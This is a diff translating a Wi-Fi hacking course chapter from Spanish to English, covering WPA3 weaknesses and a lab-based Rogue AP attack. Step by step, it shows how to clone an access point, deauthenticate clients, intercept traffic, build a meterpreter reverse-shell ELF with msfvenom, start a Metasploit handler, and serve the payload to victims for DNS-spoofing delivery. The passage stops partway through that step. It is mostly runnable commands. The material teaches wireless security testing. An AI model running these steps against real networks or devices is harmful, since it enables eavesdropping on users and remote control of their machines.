@@ -1,67 +1,68 @@
-# Extra: WPA3 y Rogue AP
-## Introducción
-Antes de finalizar, se debe comentar el funcionamiento y posibles vulnerabilidades del último protocolo de seguridad Wi-Fi que ha surgido. Además, se comentará un ataque extra que imita un punto de acceso con el objetivo de que el cliente se conecte a este en lugar de al punto legítimo con el objetivo de facilitar así un ataque de tipo MITM. En primer lugar, se detallará la parte teórica relacionada con WPA3 y finalmente se procederá a realizar el ataque conocido como Rogue AP.
+# Extra: WPA3 and Rogue AP
 
-## Protocolo de Seguridad WPA3
-WPA3 surge en el año 2018 como sucesor de WPA2, debido a las vulnerabilidades comentadas anteriormente sobre los protocolos WPA/WPA2. A fecha de este curso es el protocolo de seguridad en redes inalámbricas más actual y seguro conocido. En mayor detalle, los cambios respecto a WPA2 son: [[42](https://ieeexplore.ieee.org/document/10274082)]
-- **Reemplazo de la PSK por SAE:**
-  SAE es un nuevo mecanismo de autenticación que busca sustituir el proporcionado por WPA/WPA2 mediante la clave precompartida, debido a su vulnerabilidad frente ataques de diccionario. Este algoritmo de basa en el estándar de intercambio de clave seguro Dragonfly Key Exchange, dificultando a los atacantes probar masivas cantidades de contraseñas.
+## Introduction
+Before finishing, the operation and possible vulnerabilities of the latest Wi-Fi security protocol to emerge should be discussed. In addition, an extra attack will be covered that imitates an access point so that the client connects to it instead of the legitimate one, thereby facilitating a MITM-type attack. First, the theoretical part related to WPA3 will be detailed, and finally the attack known as Rogue AP will be carried out.
+
+## WPA3 Security Protocol
+WPA3 emerged in 2018 as the successor to WPA2, due to the vulnerabilities previously discussed regarding WPA/WPA2 protocols. At the time of this course, it is the most current and secure wireless network security protocol known. In greater detail, the changes compared to WPA2 are: [[42](https://ieeexplore.ieee.org/document/10274082)]
+- **Replacement of the PSK with SAE:**
+  SAE is a new authentication mechanism that seeks to replace the one provided by WPA/WPA2 through the pre-shared key, due to its vulnerability to dictionary attacks. This algorithm is based on the secure key exchange standard Dragonfly Key Exchange, making it difficult for attackers to try massive numbers of passwords.
 
 - **OWE:**
-  Por primera vez en redes abiertas (sin necesidad de introducir claves) se establece un canal privado con cada usuario para cifrar la información que estos trasmiten, impidiendo que usuarios malintencionados puedan ver los datos intercambiados por otros usuarios en la misma red.
+  For the first time in open networks (without the need to enter keys), a private channel is established with each user to encrypt the information they transmit, preventing malicious users from seeing the data exchanged by other users on the same network.
 
 - **Forward Secrecy:**
-  WPA3 impide que aquellos que han capturado una clave maestra puedan usarla para descifrar la información de una sesión distinta a la que pertenece dicha clave.
+  WPA3 prevents those who have captured a master key from using it to decrypt information from a session other than the one to which that key belongs.
 
 - **Enterprise Enhancements:**
-  La seguridad en la versión Enterprise, mayormente destinada a entornos que requieren alta seguridad también se ve mejorada con WPA3. Este nuevo cifrado permite un uso consistente de claves de 192 bits en toda la red, así como el uso de algoritmos de cifrado y protección de la integridad robustos, como son AES-GCM-256, SHA-384.
+  Security in the Enterprise version, mostly intended for environments that require high security, is also improved with WPA3. This new encryption allows the consistent use of 192-bit keys throughout the network, as well as the use of robust encryption and integrity protection algorithms such as AES-GCM-256 and SHA-384.
 
-### Vulnerabilidades 
-A pesar de todas estas mejoras, WPA3 resulta tener algunas vulnerabilidades que fueron explotadas en el año 2019 por el conjunto de ataques Dragonblood:
+### Vulnerabilities 
+Despite all these improvements, WPA3 has some vulnerabilities that were exploited in 2019 by the set of attacks known as Dragonblood:
 - **Downgrade Attack:** [[42](https://ieeexplore.ieee.org/document/10274082)]
-  Este tipo de ataques se basa en engañar al dispositivo que implementa WPA3 para que use un protocolo de inferior seguridad como puede ser WPA2.
+  This type of attack is based on tricking the device implementing WPA3 into using a lower-security protocol such as WPA2.
 - **Side-Channel Timing Attacks:**
-  Permite a un atacante conocer parte de la clave SAE debido a una mala implementación de este algoritmo. Se basa en las operaciones que resuelve SAE para determinar si un punto ECC es válido o no, de forma que estas implementaciones tardan un tiempo diferente cuando es válido a cuando no lo es, lo cual es aprovechado por este tipo de ataques.
+  Allows an attacker to learn part of the SAE key due to a poor implementation of this algorithm. It is based on the operations SAE solves to determine whether an ECC point is valid or not, so these implementations take a different amount of time when it is valid than when it is not, which is exploited by this type of attack.
 - **Cache-based Side-Channel Attacks:**
-  Se aprovecha de aquellos entornos donde el atacante comparte CPU (como máquinas virtuales), de tal forma que observando la caché de la CPU se puede llegar a extraer patrones criptográficos de la implementación SAE.
+  Takes advantage of environments where the attacker shares the CPU (such as virtual machines), so that by observing the CPU cache it may be possible to extract cryptographic patterns from the SAE implementation.
 
-### Contramedidas y recomendaciones
-Este tipo de ataques requieren unas condiciones específicas, normalmente difíciles de encontrar o provocar. Por ello, WPA3 sigue siendo considerado un protocolo de seguridad muy robusto. Su uso está recomendado siempre que sea posible, pero sin dejar de darle importancia a una buena configuración debido a lo seguro que resulta. Siempre es importante tener los dispositivos que lo implementan bien configurados y actualizados para evitar que condiciones ajenas a WPA3 pongan en riesgo su seguridad. 
+### Countermeasures and recommendations
+These types of attacks require specific conditions, which are usually difficult to find or provoke. Therefore, WPA3 is still considered a very robust security protocol. Its use is recommended whenever possible, but without neglecting the importance of proper configuration due to how secure it is. It is always important to keep the devices that implement it well configured and updated to prevent conditions unrelated to WPA3 from putting their security at risk.
 
 ## Rogue AP
 <img width="706" height="599" alt="image" src="https://github.com/user-attachments/assets/446ac8f2-41a0-4214-9c17-c6f36c0dbd2a" />
-Este ataque se basa en la configuración de la tarjeta de red del atacante a modo de punto de acceso Wi-Fi que tenga exactamente las mismas características que el punto de acceso que trata de imitar (MAC y SSID principalmente). De esta forma se buscar imitar un punto de acceso concreto al que usualmente se conecta la víctima en cuestión (o al que ya está conectada). Por tanto, al crear este punto de acceso falso que imita al legítimo, el atacante puede aprovechar ciertas configuraciones que le permitan ser indistinguible al original, de tal manera que una señal más fuerte de este haga que el dispositivo víctima se conecte al dispositivo del atacante preferentemente del dispositivo víctima. Otra opción es aprovechar la conexión automática a una red conocida cuando la víctima se encuentra fuera del área del dispositivo legítimo, pero dentro del área de este punto de acceso falso.
 
+This attack is based on configuring the attacker’s network card as a Wi-Fi access point that has exactly the same characteristics as the access point it is trying to imitate (mainly MAC and SSID). In this way, it seeks to imitate a specific access point to which the victim in question usually connects (or is already connected). Therefore, by creating this fake access point that imitates the legitimate one, the attacker can take advantage of certain configurations that make it indistinguishable from the original, in such a way that a stronger signal from it makes the victim device connect to the attacker’s device instead of the legitimate one. Another option is to take advantage of the automatic connection to a known network when the victim is outside the range of the legitimate device, but within the range of this fake access point.
 
-Además, el punto de acceso falso debe dar servicio a Internet o a la red habitual a la cual se conecta el dispositivo para evitar que el usuario se dé cuenta, lo cual se traduce en la capacidad de robar o cambiar cualquier información que pase a través del dispositivo del atacante (MITM). Por tanto, el atacante tiene la capacidad de realizar entre otros, los ataques relacionados con [`MITM`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/tree/Attacks#mitm-con-mensajes-en-claro) vistos en una sección previa. 
+In addition, the fake access point must provide access to the Internet or to the regular network to which the device connects in order to prevent the user from noticing, which translates into the ability to steal or alter any information passing through the attacker’s device (MITM). Therefore, the attacker has the ability to carry out, among others, the [`MITM`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/Attacks#mitm-con-mensajes-en-claro) attacks seen in a previous section.
 
-Por otro lado, resulta necesario conocer la clave del punto de acceso que se desea imitar, ya que para poder hacer un punto de acceso totalmente idéntico y que el usuario no sospeche, es necesario que este tenga la misma contraseña. Además, esto resulta necesario para poder aprovechar las conexiones automáticas que normalmente tenemos activas en nuestros dispositivos.
+On the other hand, it is necessary to know the key of the access point to be imitated, since in order to create a fully identical access point and avoid raising suspicion in the user, it must have the same password. In addition, this is necessary in order to take advantage of the automatic connections that we usually have enabled on our devices.
 
-### Proceso de Ataque
-Para este ataque se toman como base aquellos ficheros que construyen el laboratorio para [`WPA/WPA2 PSK`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/tree/WPA/WPA2-PSK), los cuales se encuentran también en esta rama. Sim embargo, se recomienda encarecidamente elegir la rama que se desee para lanzar el ataque, incluso probar varias de ellas (recalcando que la rama de [`WPA/WPA2 Enterprise`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/tree/WPA/WPA2-RADIUS) ya hace un ataque de este estilo con un objetivo diferente). 
+### Attack Process
+For this attack, the files that build the lab for [`WPA/WPA2 PSK`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/WPA/WPA2-PSK) are taken as the basis, and they are also found in this branch. However, it is strongly recommended to choose whichever branch you want in order to launch the attack, and even try several of them (emphasizing that the [`WPA/WPA2 Enterprise`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/WPA/WPA2-RADIUS) branch already performs an attack of this kind, but with a different objective).
 
-Como todos los ataques anteriores se debe empezar arrancando el laboratorio y la máquina del atacante con objeto de lanzar las herramientas de `aircrack-ng` que nos permiten analizar la red víctima:
-```
-# Arrancar el laboratorio
+As with all previous attacks, the first step is to start the lab and the attacker machine in order to launch the `aircrack-ng` tools that allow us to analyze the victim network:
+```bash
+# Start the lab
 sudo ./launch.sh
 docker-compose exec attacker-1 bash
-# Dentro de la shell de la máquina atacante:
+# Inside the attacker machine shell:
 airmon-ng start wlan4
 airodump-ng wlan4mon
-# Eliminar modo monitor tras finalizar el escaneo
+# Remove monitor mode after finishing the scan
 airmon-ng stop wlan4mon
 ```
 <img width="905" height="535" alt="image" src="https://github.com/user-attachments/assets/280f33db-ee46-4399-834b-becf0b8266ea" />
 
-`Nota: ` En este laboratorio se usan 2 interfaces inalámbricas para el atacante con objeto de usar el modo monitor (típicamente se usará `wlan4`) y el modo punto de acceso (típicamente se usará `wlan5`) de manera simultánea.
+`Note:` In this lab, 2 wireless interfaces are used for the attacker in order to use monitor mode (typically `wlan4`) and access point mode (typically `wlan5`) simultaneously.
 
-De esta forma se aprecia como nos enfrentamos a una red de tipo `WPA2` con `CCMP`, algo fácil de imitar con la herramienta `hostapd` vista anteriormente. De esta forma, se puede crear el siguiente fichero `hostapd.conf` (ya cargado en la máquina Kali) que intenta imitar de la forma más fiel posible el punto de acceso víctima (pero en abierto, simulando que no conocemos la clave):
-```
-# Ver o modificar el archivo
+In this way, it can be seen that we are facing a `WPA2` network with `CCMP`, something easy to imitate using the `hostapd` tool seen previously. Thus, the following `hostapd.conf` file can be created (already loaded on the Kali machine), which attempts to imitate the victim access point as faithfully as possible (but in open form, pretending that we do not know the key):
+```bash
+# View or modify the file
 nano hostapd.conf
 ```
-```
-# Contenido de hostapd.conf suponiendo que conocemos la clave
+```ini
+# Contents of hostapd.conf assuming we know the key
 interface=wlan5
 ssid=WPAnetwork
 channel=6
@@ -71,74 +72,74 @@ wpa_passphrase=passw0rd123
 wpa_key_mgmt=WPA-PSK
 rsn_pairwise=CCMP
 ```
-`Nota: ` Se presupone que la clave del punto de acceso legítimo ha sido obtenida con anterioridad.
+`Note:` It is assumed that the legitimate access point key has been obtained beforehand.
 
-Antes de lanzar este punto de acceso es necesario darle una IP a la interfaz inalámbrica del atacante:
-```
-# IP del punto de acceso (de su interfaz inalámbrica)
+Before launching this access point, it is necessary to assign an IP address to the attacker’s wireless interface:
+```bash
+# IP address of the access point (of its wireless interface)
 ip addr add 10.5.2.193/26 dev wlan5
 ```
 
-Así como configurar un servicio DHCP que emita IPs a los usuarios conectados (se usa una subred diferente para poder comprobar a que punto de acceso nos conectamos):
-```
-# Configuracion DHCP guardada en /etc/dhcp/dhcpd.conf
+As well as configure a DHCP service that will issue IP addresses to connected users (a different subnet is used to be able to check which access point we are connected to):
+```conf
+# DHCP configuration saved in /etc/dhcp/dhcpd.conf
 ddns-update-style interim;
 ignore client-updates;
 authoritative;
 
 subnet 10.5.2.192 netmask 255.255.255.192 {
-    range  10.5.2.194 10.5.2.254;   				                    # Rango de IPs (10.5.2.192/26) que se repartiran entre los usuarios conectados
-    option subnet-mask 255.255.255.192;    			                # Mascara de subred que usaran los usuarios conectados
-    option broadcast-address 10.5.2.255;  			                # Dirección de broadcast usada por los usuarios coenctados
-    option routers 10.5.2.193;         				                  # Gateway usado por defecto por los usuarios conectados (IP del punto de acceso)
-    option domain-name-servers 10.5.2.193, 8.8.8.8, 8.8.4.4;  	# IPs de los DNS por defecto usadas por los usuarios conectados
+    range  10.5.2.194 10.5.2.254;                                      # Range of IPs (10.5.2.192/26) to be assigned to connected users
+    option subnet-mask 255.255.255.192;                                # Subnet mask used by connected users
+    option broadcast-address 10.5.2.255;                               # Broadcast address used by connected users
+    option routers 10.5.2.193;                                         # Default gateway used by connected users (access point IP)
+    option domain-name-servers 10.5.2.193, 8.8.8.8, 8.8.4.4;           # Default DNS IPs used by connected users
 
-    default-lease-time 21600;    				                        # Tiempo en segundos hasta que expire la IP actual de cada usuario conectado
+    default-lease-time 21600;                                          # Time in seconds until each connected user's current IP expires
     max-lease-time 43200;
 }
 ```
-```
-# Matar proceso DHCP anterior
+```bash
+# Kill previous DHCP process
 pkill dhcpd
-# Configurar ficheros necesarios para DHCP 
+# Configure necessary files for DHCP 
 touch /var/lib/dhcp/dhcpd.leases
 chown root:root /var/lib/dhcp/dhcpd.leases
-# Lanzar servicio DHCP
+# Launch DHCP service
 dhcpd -cf /etc/dhcp/dhcpd.conf wlan5
 ```
-* -cf /etc/dhcp/dhcpd.conf: ubicación del fichero de configuración DHCP (en este caso se podría omitir al encontrarse en la ubicación por defecto).
-* wlan4: interfaz donde se levantará el servicio DHCP (interfaz que actuará como punto de acceso).
+* `-cf /etc/dhcp/dhcpd.conf`: location of the DHCP configuration file (in this case it could be omitted since it is in the default location).
+* `wlan4`: interface on which the DHCP service will be started (the interface acting as the access point).
 
-Ahora que ya está todo listo para imitar el punto de acceso legítimo, se puede lanzar la herramienta `hostapd` para crear un punto de acceso falso que sea idéntico:
-```
-pkill hostapd    # Matar proceso hostapd anterior
+Now that everything is ready to imitate the legitimate access point, the `hostapd` tool can be launched to create a fake access point identical to it:
+```bash
+pkill hostapd    # Kill previous hostapd process
 hostapd hostapd.conf 
 ```
-* hostapd.conf: fichero de configuración que define los detalles del punto de acceso.
-* -B: ejecutar en segundo plano (opcional pero no recomendable en este caso para poder ver cuando se conectan las víctimas).
+* `hostapd.conf`: configuration file that defines the details of the access point.
+* `-B`: run in the background (optional but not recommended in this case in order to see when victims connect).
 
-Ahora se acosnseja comprobar la buena configiración de la nueva red con `airodump-ng`, donde se deberían ver 2 redes de igual SSID:
-```
-# En otra terminal
-# Activar modo monitor si se deshabilitó
+It is now advisable to verify the proper configuration of the new network with `airodump-ng`, where 2 networks with the same SSID should be visible:
+```bash
+# In another terminal
+# Enable monitor mode again if it was disabled
 airmon-ng start wlan4
 airodump-ng wlan4mon
 ```
 <img width="987" height="202" alt="image" src="https://github.com/user-attachments/assets/6e3f285b-32f0-4915-9b97-c3b8c6707cf3" />
 
-También es aconsejable probar la conexión mediante la interfaz secundaria habilitada para el atacante (`wlan4`):
-```
-# Cese del modo monitor
+It is also advisable to test the connection using the secondary interface enabled for the attacker (`wlan4`):
+```bash
+# Stop monitor mode
 airmon-ng stop wlan4mon
-# Conectarse al punto de acceso
+# Connect to the access point
 pkill wpa_supplicant
 wpa_supplicant -i wlan4 -c wpa_supplicant.conf -B
-# Pedir al servicio DHCP una IP una vez conectado al AP
+# Request an IP from the DHCP service once connected to the AP
 dhclient wlan4
 ```
-```
-# Contenido de wpa_supplicant.conf para conexión con clave
-# Ademas se añade la MAC del atacante para asegurar que se conecta a esta
+```ini
+# Contents of wpa_supplicant.conf for connection using the key
+# The attacker MAC is also added to ensure it connects to this one
 network={
     ssid="WPAnetwork"
     psk="passw0rd123"
@@ -147,75 +148,75 @@ network={
 ```
 <img width="718" height="820" alt="image" src="https://github.com/user-attachments/assets/ee6b57a5-3d34-4a87-90a7-b8136436ee7d" />
 
-`Nota: ` Se confirma que se encuentra en el punto de acceso atacante porque ambas interfaces están en el mismo rango de red (`10.5.2.192/26`), el cual coincide con el de punto de acceso falso y no con el legítimo (`10.5.2.129/26`).
+`Note:` It is confirmed that it is connected to the attacker access point because both interfaces are in the same network range (`10.5.2.192/26`), which matches the fake access point and not the legitimate one (`10.5.2.129/26`).
 
-Una vez visto que todo funciona correctamente, podemos proceder a usar la herramienta `aireplay-ng` vista en ataques anteriores con objeto de deautenticar los clientes del punto de acceso legítimo, haciendo posible que se conecten a nuestro punto de acceso falso:
-```
-# En otra terminal (forzar canal para aireplay)
+Once it has been verified that everything works correctly, we can proceed to use the `aireplay-ng` tool seen in previous attacks in order to deauthenticate the clients of the legitimate access point, making it possible for them to connect to our fake access point:
+```bash
+# In another terminal (force channel for aireplay)
 docker-compose exec attacker-1 bash
 airmon-ng start wlan4
 airodump-ng -c 6 wlan4mon
-# En otra terminal 
+# In another terminal 
 docker-compose exec attacker-1 bash
 aireplay-ng -0 10 -a 02:00:00:00:00:00 wlan4mon
 ```
-- `-0:` deauthentication (ataque que fuerza deautenticaciones).
-- `10:` número de mensajes de deautenticación enviados (valor alto para asegurar una desconexión durante un tiempo suficiente para que se conecten al AP falso).
-- `-a 02:00:00:00:00:00:` dirección MAC del punto de acceso.
-- `-c 02:00:00:00:02:00:` dirección MAC del cliente al que deautenticar (opcional, ya que en este caso en mejor que se lance a todos).
-- `wlan4:` nombre de la interfaz usada.
+- `-0:` deauthentication (attack that forces deauthentications).
+- `10:` number of deauthentication messages sent (high enough value to ensure a disconnection for long enough that they connect to the fake AP).
+- `-a 02:00:00:00:00:00:` MAC address of the access point.
+- `-c 02:00:00:00:02:00:` MAC address of the client to deauthenticate (optional, since in this case it is better to launch it against all of them).
+- `wlan4:` name of the interface used.
 <img width="859" height="643" alt="image" src="https://github.com/user-attachments/assets/cea6d0d8-0b41-425d-8c05-3a9172f85ecf" />
 <img width="852" height="429" alt="image" src="https://github.com/user-attachments/assets/1853b702-796e-41e6-a71f-55871d952e96" />
 <img width="914" height="287" alt="image" src="https://github.com/user-attachments/assets/29aa5bfa-b280-4481-84bb-5a0f8f7de0f4" />
 
-`Nota: ` Al igual que en ataques anteriores, los mensajes EAPOL capturados indican que se ha hecho una autenticación, posiblemente en el punto de acceso creado por el atacante (las `MAC` indican que este proceso es contra el AP atacante).
+`Note:` As in previous attacks, the captured EAPOL messages indicate that an authentication has taken place, possibly on the access point created by the attacker (the `MAC` addresses indicate that this process is against the attacker’s AP).
 
-Tras ver que alguno de los clientes está conectado, nuestro objetivo se habrá cumplido, teniendo así acceso a la información que atraviesa el punto de acceso. De esta forma, se podría lanzar cualquiera de los ataques MITM vistos en el capítulo [`Attacks`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/tree/Attacks) (acción que se recomienda probar). Sin embargo, se lanzará un ataque distinto del mismo tipo (MITM) con objeto de comprobar la utilidad de crear un punto de acceso falso que imite al legítimo.
+Once it is seen that some clients are connected, our objective will have been achieved, thus gaining access to the information traversing the access point. In this way, any of the MITM attacks seen in the [`Attacks`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/Attacks) chapter could be launched (something that is recommended to try). However, a different attack of the same type (MITM) will be launched in order to verify the usefulness of creating a fake access point that imitates the legitimate one.
 
-Antes de continuar, sería recomendable dar acceso a Internet o aquella red a la cual el punto de acceso legítimo esté conectado para hacer un ataque más realista. Por este motivo, se realiza una conexión al punto de acceso legítimo (se asume un previo ataque como el mostrado en el capítulo [`WPA/WPA2 PSK Cracking Lab`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/tree/WPA/WPA2-PSK) que permita conocer la clave de acceso) desde el punto de acceso falso. Además, se imponen en este último las siguientes reglas `iptables` (reglas de firewall) que permiten que el tráfico viaje del punto de acceso falso al legítimo y al resto de la red:
-```
-# Permitir el paso a través de paquetes
+Before continuing, it would be advisable to provide Internet access or access to the network to which the legitimate access point is connected in order to make the attack more realistic. For this reason, a connection is made to the legitimate access point (assuming a previous attack such as the one shown in the [`WPA/WPA2 PSK Cracking Lab`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/WPA/WPA2-PSK) chapter that allowed the access key to be discovered) from the fake access point. In addition, the following `iptables` rules (firewall rules) are imposed on the latter, allowing traffic to travel from the fake access point to the legitimate one and the rest of the network:
+```bash
+# Enable packet forwarding
 echo 1 > /proc/sys/net/ipv4/ip_forward
 
-# Tirar todo el tráfico que pase a través de la máquina
+# Drop all traffic passing through the machine
 iptables -P FORWARD DROP
 
-# Permitir únicamente el tráfico a través de la WLAN creada
+# Only allow traffic through the created WLAN
 iptables -A FORWARD -s 10.5.2.192/26 -d 10.5.2.192/26 -i wlan5 -o wlan5 -j ACCEPT
 
-# Permitir únicamente el tráfico a través de la red inalámbrica (y enmascarar este) a la cableada  
+# Only allow traffic through the wireless network (and masquerade it) to the wired one  
 iptables -A FORWARD -s 10.5.2.192/26 -i wlan5 -o wlan4 -j ACCEPT
 iptables -A FORWARD -d 10.5.2.192/26 -i wlan4 -o wlan5 -j ACCEPT
 iptables -t nat -A POSTROUTING -s 10.5.2.192/26 -o wlan4 -j MASQUERADE
 
-# Permitir tráfico loopback
+# Allow loopback traffic
 iptables -A INPUT -i lo -j ACCEPT
 iptables -A OUTPUT -o lo -j ACCEPT
 ```
 
-Además, es necesario conectar la interfaz secundaria (`wlan4`) al punto de acceso legítimo para que todo funcione correctamente. Sin embargo, antes se debe comprobar que `wpa_supplicant.conf` está adaptado para conectarse a la dirección `MAC` del punto de acceso (`02:00:00:00:00:00`):
-```
-# Contenido de wpa_supplicant.conf para conexión con AP legítimo
+In addition, it is necessary to connect the secondary interface (`wlan4`) to the legitimate access point for everything to work correctly. However, before doing so, it must be verified that `wpa_supplicant.conf` is adapted to connect to the `MAC` address of the access point (`02:00:00:00:00:00`):
+```ini
+# Contents of wpa_supplicant.conf for connection to the legitimate AP
 network={
     ssid="WPAnetwork"
     psk="passw0rd123"
     bssid=02:00:00:00:00:00
 }
 ```
-```
-# Cese del modo monitor
+```bash
+# Stop monitor mode
 airmon-ng stop wlan4mon
-# Conectarse al punto de acceso
+# Connect to the access point
 pkill wpa_supplicant
 wpa_supplicant -i wlan4 -c wpa_supplicant.conf -B
-# Pedir al servicio DHCP una IP una vez conectado al AP
+# Request an IP from the DHCP service once connected to the AP
 dhclient wlan4
 ```
 <img width="720" height="796" alt="image" src="https://github.com/user-attachments/assets/9f8ad04f-9c93-4a13-81a8-e0afd0e6fcbd" />
 
-Ahora, desde cualquiera de los clientes afectados se puede comprobar que estamos en el punto de acceso falso con `ifconfig`, mostrando un rango de IP `10.5.2.192/26` en lugar del legítimo rango `10.5.2.128/26`. Además, se puede usar `ping`para comprobar que siguen siendo visibles las máquinas de la red interna gracias a las reglas `iptables` recién instauradas en el punto de acceso falso:
-```
-# En otra terminal (puede realizarse con otro cliente o máquina destino)
+Now, from any of the affected clients, it can be verified that we are on the fake access point with `ifconfig`, showing an IP range of `10.5.2.192/26` instead of the legitimate range `10.5.2.128/26`. In addition, `ping` can be used to verify that the machines on the internal network are still visible thanks to the `iptables` rules recently established on the fake access point:
+```bash
+# In another terminal (can also be done with another client or destination machine)
 docker-compose exec client-2 bash
 ifconfig
 ping 10.5.2.21
@@ -223,13 +224,13 @@ curl 10.5.1.20
 ```
 <img width="761" height="837" alt="image" src="https://github.com/user-attachments/assets/fbedb332-4bbd-4da3-9a5b-7cf6bc153df4" />
 
-También se puede probar a ver el tráfico que pasa por el punto de acceso con herramientas como `ettercap` o `tcpdump`:
-```
+It is also possible to inspect the traffic passing through the access point with tools such as `ettercap` or `tcpdump`:
+```bash
 ettercap -T -i wlan5
 tcpdump -i wlan5 -n -vv
 ```
-```
-# En otra terminal
+```bash
+# In another terminal
 docker-compose exec client-1 bash
 curl 10.5.1.21
 ```
@@ -237,105 +238,104 @@ curl 10.5.1.21
 <img width="721" height="551" alt="image" src="https://github.com/user-attachments/assets/8d581094-2190-4064-8a68-f2cead3d312b" />
 <img width="1856" height="837" alt="image" src="https://github.com/user-attachments/assets/a54ca3f6-2352-4937-8d31-ee74e95c0d14" />
 
-`Nota: ` Ejecutar `echo 1 > /proc/sys/net/ipv4/ip_forward` en la máquina atcante tras activar `ettercap`, ya que `ettercap` a veces desactiva el bit de `FORWARDING`
+`Note:` Run `echo 1 > /proc/sys/net/ipv4/ip_forward` on the attacker machine after enabling `ettercap`, since `ettercap` sometimes disables the `FORWARDING` bit.
 
-Aquí por ejemplo se ve como intercepta correctamente tráfico HTTP que establece uno de los clientes contra los servidores de la organización.
+Here, for example, it can be seen how it correctly intercepts HTTP traffic established by one of the clients with the organization’s servers.
 
-`Nota: ` Esto es similar a un ataque con `ettercap` para ver el tráfico en plano, tal y como se vio en [`Attacks`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/tree/Attacks#mitm-con-mensajes-en-claro).
+`Note:` This is similar to an attack with `ettercap` to view plaintext traffic, as seen in [`Attacks`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/Attacks#mitm-con-mensajes-en-claro).
 
-De esta forma, se comprueba que el ataque ha sido un éxito, siendo muy difícil de detectar para los usuarios afectados. Por tanto, ha llegado el momento de lanzar un ataque MITM que sea capaz de introducir malware en los dispositivos afectados con objeto de obtener el control sobre estos. En primer lugar, se empezará creando una shell reversa (la víctima se conecta al atacante para que este pueda ejecutar comandos sobre la víctima) a forma de malware con la ayuda de la herramienta `msfpayload` (parte del framework metasploit visto anteriormente):
-```
+Thus, it is verified that the attack has been successful, being very difficult for affected users to detect. Therefore, the time has come to launch a MITM attack capable of introducing malware into the affected devices in order to gain control over them. First, a reverse shell (the victim connects to the attacker so that the attacker can execute commands on the victim) will be created as malware with the help of the `msfpayload` tool (part of the Metasploit framework seen previously):
+```bash
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.5.2.193 LPORT=443 -f elf -o /attacker/exploit.elf
 ```
-* `-p linux/x86/meterpreter/reverse_tcp:` shell reversa para Linux.
-* `LHOST=10.5.2.193:` dirección IP donde el atacante escuchará la shell inversa.
-* `LPORT=443:` puerto TCP donde el atacante escuchará la shell inversa.
-* `-f elf:` ejecutable de Linux.
-* `-o /attacker/exploit.exe:` fichero donde se creará el malware.
+* `-p linux/x86/meterpreter/reverse_tcp:` reverse shell for Linux.
+* `LHOST=10.5.2.193:` IP address where the attacker will listen for the reverse shell.
+* `LPORT=443:` TCP port where the attacker will listen for the reverse shell.
+* `-f elf:` Linux executable.
+* `-o /attacker/exploit.exe:` file where the malware will be created.
 
-Una vez creado el malware, se debe abrir una consola de `metasploit` (esto ya ha sido usado en [`Attacks`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/tree/Attacks#ataque-con-metasploit)) con la intención de preparar la máquina del atacante para que escuche las peticiones de la shell reversa y pueda ejecutar comandos en la víctima una vez esta se conecta:
-```
+Once the malware has been created, a `metasploit` console must be opened (this has already been used in [`Attacks`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/Attacks#ataque-con-metasploit)) in order to prepare the attacker machine to listen for reverse shell requests and execute commands on the victim once it connects:
+```bash
 msfconsole
-# Una vez dentro de la consola
+# Once inside the console
 use exploit/multi/handler
 set payload linux/x86/meterpreter/reverse_tcp
 set LHOST 10.5.2.193
 set LPORT 443
-# Si se desea ver en más detalle las opciones del exploit
+# If you want to see the exploit options in more detail
 show options
-# Lanzar el ataque 
+# Launch the attack 
 run
 ```
 <img width="841" height="841" alt="image" src="https://github.com/user-attachments/assets/33445ee0-03a1-481a-928e-5b58657ece12" />
 <img width="876" height="491" alt="image" src="https://github.com/user-attachments/assets/63b413a1-5877-4c0d-bba3-26adaecdd9ac" />
 
-De esta forma, ya tenemos una terminal que espera a que un cliente legítimo caiga en la trampa y se conecte con la shell inversa. En cambio, aún queda parte de la configuración necesaria para que el tráfico del cliente sea desviado haciendo que se descargue y ejecute el fichero con malware creado (`exploit.elf`). En primer lugar, se debe crear un sitio web encargado de descargar este exploit en las víctimas. Para ello se usa Python para servir rápidamente los ficheros de la ruta `/var/www/html` cuando se acceda al puerto `80` (`HTTP`) del atacante en la interfaz `wlan5` (la cual es visible como `10.5.2.193` en la red `10.5.2.192/26` ofrecida por el punto de acceso falso):
-```
+In this way, we already have a terminal waiting for a legitimate client to fall into the trap and connect with the reverse shell. However, part of the necessary configuration still remains so that the client’s traffic is diverted, causing the created malware file (`exploit.elf`) to be downloaded and executed. First, a website must be created to deliver this exploit to victims. To do this, Python is used to quickly serve the files in `/var/www/html` when port `80` (`HTTP`) of the attacker is accessed through interface `wlan5` (which is visible as `10.5.2.193` in the `10.5.2.192/26` network provided by the fake access point):
+```bash
 cd /var/www/html
-# Hacer que se descargue desde la raiz 
+# Make it downloadable from the root 
 cp /attacker/exploit.elf ./index.html
 python3 -m http.server 80
 ```
 <img width="590" height="267" alt="image" src="https://github.com/user-attachments/assets/0bccc296-95d9-42bf-9bbb-a5ad4356905c" />
 
-Una vez lanzado el servicio solo falta redirigir el tráfico del `carlos.web.com` (también se hizo en el capítulo [`Attacks`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/tree/Attacks#dns-spoofing-para-robo-de-credenciales) hacia la web recién creada en `10.5.2.192:80`. Sin embargo, esta vez no usaremos `ettercap`, ya que no funciona muy bien cuando las víctimas se encuentran en 2 interface diferentes (`wlan4` y `wlan5`). En su lugar se usará una herramienta similar conocida como `bettercap` para realizar un `DNS Spoofing` que interfiera el dominio `carlos.web.com` para cambiarlo por la web maliciosa.
-```
-# En otra terminal (forzar canal para aireplay)
